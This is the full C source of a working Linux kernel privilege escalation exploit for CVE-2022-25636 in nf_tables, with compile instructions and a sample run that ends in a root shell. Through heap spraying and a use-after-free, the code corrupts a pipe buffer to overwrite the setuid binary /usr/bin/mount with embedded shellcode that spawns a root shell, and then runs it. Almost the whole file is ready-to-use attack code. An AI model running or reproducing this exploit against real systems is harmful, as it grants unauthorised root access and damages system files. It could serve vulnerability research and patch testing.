/**
 * CVE-2022-25636 exploit
 *
 * This exploit use pipe-primitive so no kaslr leak nor smap
 *  smep ktpi bypass is needed.
 *
 * Compile with:
 *  gcc exp.c -o exp -static -no-pie -Iinclude -Llib -lnftnl -lmnl -s
 *
 * This exploit will overwrite /usr/bin/mount with suid-shell and
 *  execute it. Backup it manually before running exploit, and
 *  restore it quickly after exploit success.
 * 
 * user@ubuntu:~$ ./exp
 * [+] STEP 0: do init
 * [*] init unshare ...
 * [*] bind cpu ...
 * [*] init msq ...
 * [*] init sock ...
 * [+] STEP 1: leak heap address
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] searching for corrupted msg_msg ...
 * [+] found corrupted msg_msg
 * [+] get heap leak: 0xffff9913f8a13000
 * [+] STEP 2: do uaf
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2046].security
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2047].security
 * [*] free corrupted msg1 to let dev uaf ...
 * [*] spray 4k skbuff data ...
 * [*] free corrupted msg2 to let skbuff uaf ...
 * [*] spray 4k msg_msg and 1k msg_msgseg ...
 * [*] free skbuff to leak msg_b->next (1k) ...
 * [+] find leak! msg[7]->next: 0xffff9913b49d9000
 * [*] edit msg_b's security and m_ts ...
 * [*] ptr->next: 0xffff9913b49d8ff8
 * [*] spray 4k skbuff data ...
 * [*] check leaked msg ...
 * 00 00 00 00 00 00 00 00  37 13 37 13 07 00 00 00  |  ........7.7.....
 * 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
 * 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
 * 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
 * [-] adjacent chunk 0 not msg_msgseg
 * 00 00 00 00 00 00 00 00  37 13 37 13 09 00 00 00  |  ........7.7.....
 * 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
 * 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
 * 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
 * [*] nice! adjacent chunk is also msg_msgseg, index: 9
 * [*] free adjacent msg_msg ...
 * [*] spray pipe buffer ...
 * [*] check if pipe buffer in adjacent chunk ...
 * 40 6B E3 02 22 FA FF FF  00 00 00 00 66 01 00 00  |  @k..".......f...
 * C0 FF 83 8E FF FF FF FF  10 00 00 00 00 00 00 00  |  ................
 * 00 00 00 00 00 00 00 00  C0 A6 4D 04 22 FA FF FF  |  ..........M."...
 * 01 00 00 00 01 00 00 00  40 14 84 8E FF FF FF FF  |  ........@.......
 * [*] nice! adjacent chunk is obtained bt pipe_buffer, index: 102
 * [*] recover edited msg_msg's m_ts and next
 * [*] edit security ptr to pipe_buffer, prepare to free
 * [*] free edited msg_msg ...
 * [*] keep skbuff not uaf
 * [*] edit pipe buffer ...
 * [*] try to overwrite /usr/bin/mount
 * [*] see if /usr/bin/mount changed
 * [+] exploit success
 * # id
 * uid=0(root) gid=0(root) groups=0(root),1001(user)
 *
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <err.h>
#include <fcntl.h>
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/table.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <sched.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#define NUM_MSQIDS (0x800)
#define HOLE_STEP (0x100)
#define MSG_TEXT_SIZE(x) (         \
    (x) - sizeof(struct msg_msg) - \
    sizeof(struct msg_msgseg) * (((x + PAGE_SIZE - 1) / PAGE_SIZE) - 1))
#define MSG_A_TEXT_SIZE MSG_TEXT_SIZE(0x1080)
#define MSG_B_TEXT_SIZE MSG_TEXT_SIZE(0x1400)
#define MTYPE_A (0x41)
#define MSG_SIG (0x13371337)
#define NUM_SOCKETS (4)
#define NUM_SKBUFFS (0x20)
#define SIZE_OF_SKB_SHARED_INFO (0x140)
#define NUM_PIPES (0x100)

#define FLOW_ACTION_REDIRECT (0x5)
#define PIPE_BUF_FLAG_CAN_MERGE (0x10)

#define ATTACK_FILE "/usr/bin/mount"

const char attack_data[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
    0x00, 0x56, 0x56, 0x56, 0x56, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0xb0, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00,
    0x02, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x51, 0xe5, 0x74, 0x64, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x31, 0xff, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x75,
    0x58, 0x0f, 0x05, 0x31, 0xff, 0x31, 0xd2, 0x31,
    0xf6, 0x6a, 0x77, 0x58, 0x0f, 0x05, 0x6a, 0x68,
    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
    0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72,
    0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01,
    0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e,
    0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31,
    0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05};

int sync_pipe[2];

int msqid[NUM_MSQIDS];

struct list_head {
    uint64_t next;
    uint64_t prev;
};

struct msg_msg {
    struct list_head m_list;
    uint64_t m_type;
    uint64_t m_ts;
    uint64_t next;
    uint64_t security;
    char mtext[0];
};

struct msg_msgseg {
    uint64_t next;
};

struct typ_msg {
    long mtype;
    char mtext[0];
};

char msg_buffer[0x4000] = {0};
struct typ_msg *msg = (struct typ_msg *)msg_buffer;

int sockfd;
int sock_pairs[NUM_SOCKETS][2];
int pipes[NUM_PIPES][2];

#define logd(fmt, ...) dprintf(2, "[*] " fmt "\n", ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, "[+] " fmt "\n", ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, "[-] " fmt "\n", ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        write(sync_pipe[1], "F", 1);       \
        exit(1);                           \
    } while (0)

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

void init_unshare() {
    int fd;
    char buff[0x100];

    // strace from `unshare -Urn xxx`
    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", getuid());
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", getgid());
    write(fd, buff, strlen(buff));
    close(fd);
}

void bind_cpu() {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("msgget");
    }
}

void init_msq() {
    for (int i = 0; i < NUM_MSQIDS; i++) {
        msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (msqid[i] < 0) {
            die("msgget");
        }
    }
}

void init_sock() {
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        die("socket()");
    }

    for (int i = 0; i < NUM_SOCKETS; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_pairs[i]) < 0) {
            die("socketpair()");
        }
    }
}

void spray_skbuff_data(void *ptr, size_t size) {
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
            if (write(sock_pairs[i][0], ptr, size) < 0) {
                die("write to sock pairs failed");
            }
        }
    }
}

void free_skbuff_data(void *ptr, size_t size) {
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
            if (read(sock_pairs[i][1], ptr, size) < 0) {
                die("read from sock pairs failed");
            }
        }
    }
}

void clean_msg() {
    for (int i = 0; i < NUM_MSQIDS; i++) {
        msgrcv(msqid[i], msg, sizeof(msg_buffer), MTYPE_A, IPC_NOWAIT);
    }
}

void spray_pipe(const char *target_file) {
    int fd = open(target_file, O_RDONLY);
    if (fd < 0) {
        die("open %s failed", target_file);
    }

    for (int i = 0; i < NUM_PIPES; i++) {
        if (pipe(pipes[i])) {
            die("alloc pipe failed");
        }

        const unsigned pipe_size = fcntl(pipes[i][1], F_GETPIPE_SZ);
        static char tmp_buff[0x1000];

        /* fill the pipe completely; each pipe_buffer will now have
           the PIPE_BUF_FLAG_CAN_MERGE flag */
        for (unsigned r = pipe_size; r > 0;) {
            unsigned n = r > sizeof(tmp_buff) ? sizeof(tmp_buff) : r;
            write(pipes[i][1], tmp_buff, n);
            r -= n;
        }

        /* drain the pipe, freeing all pipe_buffer instances (but
           leaving the flags initialized) */
        for (unsigned r = pipe_size; r > 0;) {
            unsigned n = r > sizeof(tmp_buff) ? sizeof(tmp_buff) : r;
            read(pipes[i][0], tmp_buff, n);
            r -= n;
        }

        write(pipes[i][1], tmp_buff, 0x100 + i);

        loff_t offset = 1;
        ssize_t nbytes = splice(fd, &offset, pipes[i][1], NULL, 1, 0);
        if (nbytes < 0) {
            die("splice failed");
        }
    }
}

void trigger_oob_write(int legit_writes, int oob_writes) {
    // setup table
    struct nftnl_table *table = nftnl_table_alloc();
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, "x");
    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);

    // chain
    struct nftnl_chain *chain = nftnl_chain_alloc();
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, "x");
    nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, "y");
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, NF_NETDEV_INGRESS);
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_PRIO, 10);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_DEV, "lo");
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TYPE, "filter");
    // nftnl_chain_set_u32(chain, NFTNL_CHAIN_FLAGS, CHAIN_F_HW_OFFLOAD); // see below

    // and rule
    struct nftnl_rule *rule = nftnl_rule_alloc();
    nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, "x");
    nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, "y");

    struct nftnl_expr *exprs[128];
    int exprid = 0;

    exprs[exprid] = nftnl_expr_alloc("meta");
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_META_KEY, NFT_META_PROTOCOL);
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_META_DREG, NFT_REG_1);
    nftnl_rule_add_expr(rule, exprs[exprid]);
    exprid++;

    exprs[exprid] = nftnl_expr_alloc("cmp");
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_SREG, NFT_REG_1);
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_OP, NFT_CMP_EQ);
    nftnl_expr_set_u16(exprs[exprid], NFTNL_EXPR_CMP_DATA, 8);
    nftnl_rule_add_expr(rule, exprs[exprid]);
    exprid++;

    exprs[exprid] = nftnl_expr_alloc("payload");
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_BASE, NFT_PAYLOAD_NETWORK_HEADER);
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_OFFSET, 16);
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_LEN, 4);
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_PAYLOAD_DREG, NFT_REG_1);
    nftnl_rule_add_expr(rule, exprs[exprid]);
    exprid++;

    exprs[exprid] = nftnl_expr_alloc("cmp");
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_SREG, NFT_REG_1);
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_OP, NFT_CMP_EQ);
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_CMP_DATA, 0x0200007f);
    nftnl_rule_add_expr(rule, exprs[exprid]);
    exprid++;

    // with these we can control the targeted kmalloc size
    for (int i = 0; i < legit_writes; i++) {
        exprs[exprid] = nftnl_expr_alloc("immediate");
        nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_IMM_DREG, NFT_REG_1);
        nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_IMM_DATA, 1);
        nftnl_rule_add_expr(rule, exprs[exprid]);
        exprid++;
        exprs[exprid] = nftnl_expr_alloc("dup");
        nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_DUP_SREG_DEV, NFT_REG_1);
        nftnl_rule_add_expr(rule, exprs[exprid]);
        exprid++;
    }

    // oob writes
    for (int unaccounted_dup = 0; unaccounted_dup < oob_writes; unaccounted_dup++) {
        exprs[exprid] = nftnl_expr_alloc("dup");
        nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_DUP_SREG_DEV, NFT_REG_1);
        nftnl_rule_add_expr(rule, exprs[exprid]);
        exprid++;
    }

    // serialize
    char buf[MNL_SOCKET_BUFFER_SIZE];

    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
    int seq = 0;

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    struct nlmsghdr *nlh;
    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                      NFT_MSG_NEWTABLE, NFPROTO_NETDEV,
                                      0, seq++);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                      NFT_MSG_NEWCHAIN, NFPROTO_NETDEV,
                                      NLM_F_CREATE, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, chain);
    // libnftnl version i'm using doesn't have the CHAIN_F_HW_OFFLOAD stuff so manually add here
    mnl_attr_put_u32(nlh, NFTA_CHAIN_FLAGS, htonl(2));
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                     NFT_MSG_NEWRULE, NFPROTO_NETDEV,
                                     NLM_F_CREATE | NLM_F_APPEND, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rule);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL) {
        die("mnl_socket_open");
    }

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0) {
        die("mnl_socket_send");
    }
}

uint64_t leak_dev_addr() {
    logd("spray msg_msg ...");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        msg->mtype = MTYPE_A;
        memset(msg->mtext, 'A', MSG_A_TEXT_SIZE);
        ((int *)msg->mtext)[0] = MSG_SIG;
        ((int *)msg->mtext)[1] = i;
        if (msgsnd(msqid[i], msg, MSG_A_TEXT_SIZE, 0) < 0) {
            die("msgsnd");
        }
    }

    logd("create holes, step: %d ...", HOLE_STEP);
    for (int i = 0; i < NUM_MSQIDS; i += HOLE_STEP) {
        if (msgrcv(msqid[i], msg, MSG_A_TEXT_SIZE, MTYPE_A, 0) < 0) {
            die("msgrcv");
        }
    }

    logd("triggering oob write ...");
    trigger_oob_write(1, 1); // in slab-128 (0x80)

    logd("searching for corrupted msg_msg ...");
    uint64_t dev_addr = 0;
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if ((i % HOLE_STEP) == 0) {
            continue;
        }
        if (msgrcv(msqid[i], msg, MSG_A_TEXT_SIZE, 0, MSG_COPY | IPC_NOWAIT) < 0) {
            die("msgrcv");
        }
        uint64_t *leak_pos = (uint64_t *)(msg->mtext + (PAGE_SIZE - sizeof(struct msg_msg)));
        if (memcmp(leak_pos, "AAAAAAAA", 8)) {
            logi("found corrupted msg_msg");
            logi("get heap leak: 0x%lx", leak_pos[0]);
            dev_addr = leak_pos[0];
            break;
        }
    }
    clean_msg();
    if (!dev_addr) {
        loge("leak failed, try again");
        return 0;
    }

    return dev_addr;
}

int do_we_overwrite_security_ptr() {
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if (msgrcv(msqid[i], msg, MSG_A_TEXT_SIZE, 0, MSG_COPY | IPC_NOWAIT) > 0) {
            if (msg->mtype == FLOW_ACTION_REDIRECT) {
                return i;
            }
        }
    }

    return -1;
}

int do_msg_corruption() {
    logd("spray msg_msg ...");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        msg->mtype = MTYPE_A;
        memset(msg->mtext, 'A', MSG_A_TEXT_SIZE);
        ((int *)msg->mtext)[0] = MSG_SIG;
        ((int *)msg->mtext)[1] = i;
        if (msgsnd(msqid[i], msg, MSG_A_TEXT_SIZE, 0) < 0) {
            die("msgsnd");
        }
    }

    logd("create holes, step: %d ...", HOLE_STEP);
    for (int i = 0; i < NUM_MSQIDS; i += HOLE_STEP) {
        if (msgrcv(msqid[i], msg, MSG_A_TEXT_SIZE, MTYPE_A, 0) < 0) {
            die("msgrcv");
        }
    }

    logd("triggering oob write ...");
    logd("wish we overwrite msg.security to dev");
    int corrupted_sec_idx = -1;
    for (int k = 0; k < 3; k++) {
        trigger_oob_write(50, 2); // in slab-4k (0x1000)
        corrupted_sec_idx = do_we_overwrite_security_ptr();
        if (corrupted_sec_idx >= 0) {
            logi("yes, we overwrite msg[%d].security", corrupted_sec_idx);
            break;
        }
    }
    if (corrupted_sec_idx < 0) {
        clean_msg();
        loge("overwrite msg.security (maybe bad luck)");
        return -1;
    }
    int corrupted_msqid = msqid[corrupted_sec_idx];
    msqid[corrupted_sec_idx] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);

    // clean
    clean_msg();
    return corrupted_msqid;
}

int do_uaf(int corrupted_sec_msqid1, int corrupted_sec_msqid2) {
    logd("free corrupted msg1 to let dev uaf ...");
    if (msgrcv(corrupted_sec_msqid1, msg, MSG_A_TEXT_SIZE, FLOW_ACTION_REDIRECT, IPC_NOWAIT) < 0) {
        die("free corrupted msg1 failed");
    }

    logd("spray 4k skbuff data ...");
    char tmp_buff[PAGE_SIZE] = {0};
    memset(tmp_buff, 'X', sizeof(tmp_buff));
    spray_skbuff_data(tmp_buff, sizeof(tmp_buff) - SIZE_OF_SKB_SHARED_INFO);

    logd("free corrupted msg2 to let skbuff uaf ...");
    if (msgrcv(corrupted_sec_msqid2, msg, MSG_A_TEXT_SIZE, FLOW_ACTION_REDIRECT, IPC_NOWAIT) < 0) {
        die("free corrupted msg2 failed");
    }

    logd("spray 4k msg_msg and 1k msg_msgseg ...");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        msg->mtype = MTYPE_A;
        memset(msg->mtext, 0, MSG_B_TEXT_SIZE);
        ((int *)msg->mtext)[0] = MSG_SIG;
        ((int *)msg->mtext)[1] = i;
        ((int *)(msg->mtext + (0x1000 - 0x30)))[0] = MSG_SIG;
        ((int *)(msg->mtext + (0x1000 - 0x30)))[1] = i;
        if (msgsnd(msqid[i], msg, MSG_B_TEXT_SIZE, 0) < 0) {
            die("msgsnd");
        }
    }

    logd("free skbuff to leak msg_b->next (1k) ...");
    uint64_t msg_next_1k = 0;
    int leak_msg_idx = -1;
    char bak_msg_b[0x1000];
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
            if (read(sock_pairs[i][1], tmp_buff, 0x1000 - SIZE_OF_SKB_SHARED_INFO) < 0) {
                die("read from sock pairs failed");
            }
            if (!msg_next_1k) {
                struct msg_msg *ptr = (struct msg_msg *)tmp_buff;
                if (ptr->m_type == MTYPE_A) {
                    msg_next_1k = ptr->next;
                    leak_msg_idx = ((int *)ptr->mtext)[1];
                    memcpy(bak_msg_b, tmp_buff, 0x1000);
                    logi("find leak! msg[%d]->next: 0x%08lx", leak_msg_idx, msg_next_1k);
                }
            }
        }
    }
    if (!msg_next_1k) {
        die("leak msg_b->next failed");
    }

    logd("edit msg_b's security and m_ts ...");

    uint64_t page_idx = 0;
    uint64_t bak_msg_next = 0;
    {
        struct msg_msg *ptr = (struct msg_msg *)bak_msg_b;
        bak_msg_next = ptr->next;
        ptr->m_ts += 0xc00;
    lbl1:
        ptr->next = (bak_msg_next & (~0xfff)) - 8 + page_idx * PAGE_SIZE;
        logd("ptr->next: 0x%08lx", ptr->next);
    }

    logd("spray 4k skbuff data ...");
    spray_skbuff_data(bak_msg_b, 0x1000 - SIZE_OF_SKB_SHARED_INFO);

    logd("check leaked msg ...");
    int adjacent_msg_idx = -1;
    int adjacent_msg_offset = 0;
    if (msgrcv(msqid[leak_msg_idx], msg, MSG_B_TEXT_SIZE + 0xc00, 0, IPC_NOWAIT | MSG_COPY) < 0) {
        die("recv leaked msg data failed");
    }
    for (int i = 0; i < 4; i++) {
        uint32_t *ptr = (uint32_t *)(msg->mtext + (0x1000 - 0x30) + (0x400 * i));
        hexdump(ptr, 0x40);
        if (ptr[2] == MSG_SIG && ptr[3] != leak_msg_idx) {
            adjacent_msg_idx = ptr[3];
            adjacent_msg_offset = 0x400 * i;
            logd("nice! adjacent chunk is also msg_msgseg, index: %d", adjacent_msg_idx);
            break;
        } else {
            loge("adjacent chunk %d not msg_msgseg", i);
        }
    }
    if (adjacent_msg_idx < 0) {
        loge("bad luck, adjacent chunk is not msg_msgseg");
        free_skbuff_data(tmp_buff, 0x1000 - SIZE_OF_SKB_SHARED_INFO);
        loge("searching in next page ...");
        page_idx++;
        goto lbl1;
    }

    logd("free adjacent msg_msg ...");
    if (msgrcv(msqid[adjacent_msg_idx], msg, MSG_B_TEXT_SIZE, 0, IPC_NOWAIT) < 0) {
        die("msgrcv");
    }

    logd("spray pipe buffer ...");
    spray_pipe(ATTACK_FILE);

    logd("check if pipe buffer in adjacent chunk ...");
    int uaf_pipe_idx = -1;
    char bak_pipe_buffer[0x400];
    if (msgrcv(msqid[leak_msg_idx], msg, MSG_B_TEXT_SIZE + 0xc00, 0, IPC_NOWAIT | MSG_COPY) < 0) {
        die("recv leaked msg data failed");
    }
    {
        char *ptr = (char *)(msg->mtext + (0x1000 - 0x30) + adjacent_msg_offset);
        hexdump(ptr, 0x40);
        if (*(uint32_t *)(ptr + 0x30) == 1 && *(uint32_t *)(ptr + 0x34) == 1) {
            uaf_pipe_idx = *(uint32_t *)(ptr + 0xc) & 0xff;
            memcpy(bak_pipe_buffer, ptr, 0x400);
            logd("nice! adjacent chunk is obtained bt pipe_buffer, index: %d", uaf_pipe_idx);
        } else {
            die("bad luck, adjacent chunk is not pipe_buffer");
        }
    }

    logd("recover edited msg_msg's m_ts and next");
    logd("edit security ptr to pipe_buffer, prepare to free");
    free_skbuff_data(tmp_buff, 0x1000 - SIZE_OF_SKB_SHARED_INFO);
    {
        struct msg_msg *ptr = (struct msg_msg *)bak_msg_b;
        ptr->m_ts -= 0xc00;
        ptr->next = bak_msg_next;
        ptr->security = (ptr->next & (~0xfff)) + page_idx * PAGE_SIZE + adjacent_msg_offset;
    }
    spray_skbuff_data(bak_msg_b, 0x1000 - SIZE_OF_SKB_SHARED_INFO);

    logd("free edited msg_msg ...");
    if (msgrcv(msqid[leak_msg_idx], msg, MSG_B_TEXT_SIZE, 0, IPC_NOWAIT) < 0) {
        die("msgrcv");
    }

    logd("keep skbuff not uaf");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(msg->mtext, 0, MSG_TEXT_SIZE(0x1000));
        msg->mtype = MTYPE_A;
        if (msgsnd(msqid[i], msg, MSG_TEXT_SIZE(0x1000), 0) < 0) {
            die("msgsnd");
        }
    }

    logd("edit pipe buffer ...");
    {
        uint64_t *ptr = (uint64_t *)bak_pipe_buffer;
        ptr[6] = 0;                       // offset | len
        ptr[8] = PIPE_BUF_FLAG_CAN_MERGE; // flag
    }
    spray_skbuff_data(bak_pipe_buffer, 0x400 - SIZE_OF_SKB_SHARED_INFO);

    logd("try to overwrite %s", ATTACK_FILE);
    {
        ssize_t nbytes = write(pipes[uaf_pipe_idx][1], attack_data, sizeof(attack_data));
        if (nbytes < 0) {
            perror("write failed");
            die();
        }
        if ((size_t)nbytes < sizeof(attack_data)) {
            fprintf(stderr, "short write\n");
            die();
        }
    }

    logd("see if %s changed", ATTACK_FILE);
    {
        int fd = open(ATTACK_FILE, O_RDONLY);
        if (fd < 0) {
            die("open attack file");
        }
        char tmp_buffer[0x10];
        read(fd, tmp_buffer, 0x10);
        uint32_t *ptr = (uint32_t *)(tmp_buffer + 9);
        if (ptr[0] != 0x56565656) {
            hexdump(tmp_buffer, 0x10);
            die("overwrite attack file failed: 0x%08x", ptr[0]);
        }
    }
    logi("exploit success");
    return 0;
}

int main(int argc, char **argv) {
    pipe(sync_pipe);

    if (!fork()) {
        logi("STEP 0: do init");
        logd("init unshare ...");
        init_unshare();
        logd("bind cpu ...");
        bind_cpu();
        logd("init msq ...");
        init_msq();
        logd("init sock ...");
        init_sock();

        logi("STEP 1: leak heap address");
        uint64_t dev_addr = 0;
        while (!dev_addr) {
            dev_addr = leak_dev_addr();
        }

        logi("STEP 2: do uaf");
        int corrupted_sec_msqid1 = -1;
        int corrupted_sec_msqid2 = -1;
        while (corrupted_sec_msqid1 < 0) {
            corrupted_sec_msqid1 = do_msg_corruption();
        }
        while (corrupted_sec_msqid2 < 0) {
            corrupted_sec_msqid2 = do_msg_corruption();
        }
        do_uaf(corrupted_sec_msqid1, corrupted_sec_msqid2);

        write(sync_pipe[1], "T", 1);
        while (1) {
            sleep(10);
        }
    } else {
        char sync;
        read(sync_pipe[0], &sync, 1);
        if (sync == 'T') {
            execl(ATTACK_FILE, ATTACK_FILE, NULL);
        }
    }

    return 0;
}